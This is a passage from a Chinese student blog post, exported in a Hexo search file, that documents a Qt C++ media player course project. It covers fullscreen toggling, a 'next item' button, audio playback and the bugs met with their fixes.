<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//鼠标双击快捷操作</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">player::mouseDoubleClickEvent</span><span class="params">(QMouseEvent*)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    up();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<hr>
<h3 id="6、全屏功能"><a href="#6、全屏功能" class="headerlink" title="6、全屏功能"></a>6、全屏功能</h3><ul>
<li>信号和槽：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">QObject::<span class="built_in">connect</span>(ui-&gt;fullscreenBtn,SIGNAL(clicked()),<span class="keyword">this</span>,SLOT(fullScr()));</span><br></pre></td></tr></table></figure></li>
<li>实现思路：<br>首先对mediaplayer的全屏状态进行判断，若为非全屏状态，使用enter键或点击全屏按钮均可进入全屏，若为全屏状态，点击enter键退出全屏。点击全屏按钮会提示“快捷键enter”,而直接点击enter键进入全屏则不会，使使用更加流畅</li>
<li>功能截图：<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/42qncuu3smxal1v9ht7cf8u9/image_1dfos09ubggj2c149p4brj6d4e.png"  alt="image_1dfos09ubggj2c149p4brj6d4e.png-1611.1kB"></li>
<li>实现方法：<br>player类：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">player::fullScr</span><span class="params">()</span><span class="comment">//全屏功能</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(mediaplayer-&gt;state()==<span class="number">1</span>)<span class="comment">//若正在播放，则可进入全屏状态</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//全屏前需要取消小窗置顶</span></span><br><span class="line">        setWindowFlags(<span class="literal">nullptr</span>);</span><br><span class="line">        show();</span><br><span class="line">        <span class="comment">//全屏</span></span><br><span class="line">        videowidget-&gt;setFullScreen(<span class="literal">true</span>);</span><br><span class="line">        QMessageBox::about(<span class="keyword">this</span>, tr(<span class="string">"Tips"</span>), tr(<span class="string">"enter键进入/退出全屏"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        &#123;</span><br><span class="line">             <span class="comment">//当前不在播放视频，无法进入全屏模式</span></span><br><span class="line">            videowidget-&gt;setFullScreen(<span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
在video类也写入槽函数：<br>解决全屏后player类父窗口无法接收到信号的问题<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">video::keyPressEvent</span><span class="params">(QKeyEvent *keyset)</span><span class="comment">//全屏和全屏退出</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">if</span>(keyset-&gt;key()==<span class="number">16777220</span>)<span class="comment">//回车键</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;isFullScreen())<span class="comment">//如果当前出于全屏状态</span></span><br><span class="line">     &#123;</span><br><span class="line">        <span class="comment">//退出全屏</span></span><br><span class="line">         <span class="keyword">this</span>-&gt;setWindowFlags (Qt::SubWindow);</span><br><span class="line">         <span class="keyword">this</span>-&gt;showNormal();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;  </span><br><span class="line">        <span class="comment">//进入全屏</span></span><br><span class="line">         <span class="keyword">this</span>-&gt;setFullScreen(<span class="literal">true</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<hr>
<h3 id="7、播放下一项"><a href="#7、播放下一项" class="headerlink" title="7、播放下一项"></a>7、播放下一项</h3><ul>
<li>信号和槽<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">QObject::<span class="built_in">connect</span>(ui-&gt;next,SIGNAL(clicked()),<span class="keyword">this</span>,SLOT(next_song()));</span><br></pre></td></tr></table></figure></li>
<li>实现思路<br>将进度条拉至最后</li>
<li>截图：<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/f31brtilw6us0mf1zkgdk4xg/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%28150%29.png"  alt="屏幕截图(150).png-119kB"></li>
<li>实现方法<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">player::next_song</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setPosition(<span class="number">100</span>*time2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>注意事项</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//需将mediaplayer设置为循环播放，否则会在播放最后一项时再点击next会导致程序退出</span></span><br><span class="line">playlist-&gt;setPlaybackMode(QMediaPlaylist::Loop);</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="8、可作为音频播放器使用"><a href="#8、可作为音频播放器使用" class="headerlink" title="8、可作为音频播放器使用"></a>8、可作为音频播放器使用</h3><ul>
<li>功能描述：支持音频播放，支持播放列表中同时存在视频和音频</li>
<li>功能截图：<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/9hnnqr8gda8ezy5ql3s1dya2/image_1dfotiu3b1v81j6g9nrtns4o157.png"  alt="image_1dfotiu3b1v81j6g9nrtns4o157.png-8.6kB"></li>
</ul>
<hr>
<h3 id="遇到的问题和解决方法"><a href="#遇到的问题和解决方法" class="headerlink" title="遇到的问题和解决方法"></a>遇到的问题和解决方法</h3><p>（*注：部分细节问题以列入代码注释中）</p>
<ul>
<li>ui-&gt;designer中的控件运行之后界面不显示<ul>
<li>被设置为中心layout的widget所覆盖，需添加QVBoxLayout，分离widget和按钮控件</li>
</ul>
</li>
<li>进度条无法正常使用<ul>
<li>需正确设置进度条位置和视频播放位置的换算比例（time2）</li>
</ul>
</li>
<li>durationChanged()函数执行后，文件时间长度值time依然为0<ul>
<li>重写时间获取槽函数<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">QObject::<span class="built_in">connect</span>(mediaplayer,SIGNAL(positionChanged(qint64)),<span class="keyword">this</span>,SLOT(positionChanged(qint64)));</span><br><span class="line"></span><br><span class="line">QObject::<span class="built_in">connect</span>(mediaplayer,SIGNAL(durationChanged(qint64)),<span class="keyword">this</span>,SLOT(getDuration()));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">player::getDuration</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//获取视频文件时间长度</span></span><br><span class="line">    time=mediaplayer-&gt;duration();</span><br><span class="line">    <span class="comment">//horizontalbar的长度为100，time2为比例系数</span></span><br><span class="line">    time2=(<span class="keyword">int</span>)time/<span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>全屏后无法退出<ul>
<li>全屏后信号被子窗口（video）接收，父窗口（player）无法接收到信号，而全屏相关函数的信号接收对象是父窗口，故无法接收到信号。</li>
<li>所以，只需在video类中也写入全屏函数即可，详见“6、全屏功能”</li>
</ul>
</li>
<li>程序每次运行只能播放一首曲目<ul>
<li>改用QStringList记录文件名，优化playlist写入方式，详见上文“2、文件批量载入”</li>
</ul>
</li>
<li>“下一项”功能受限，导入的文件只能播放一次<ul>
<li>需将mediaplayer设置为循环播放，否则会在播放最后一项时再点击next会导致程序退出<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">playlist-&gt;setPlaybackMode(QMediaPlaylist::Loop);</span><br></pre></td></tr></table></figure>


</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Qt</category>
      </categories>
      <tags>
        <tag>Qt</tag>
        <tag>大一</tag>
        <tag>作业</tag>
        <tag>大作业</tag>
      </tags>
  </entry>
</search>
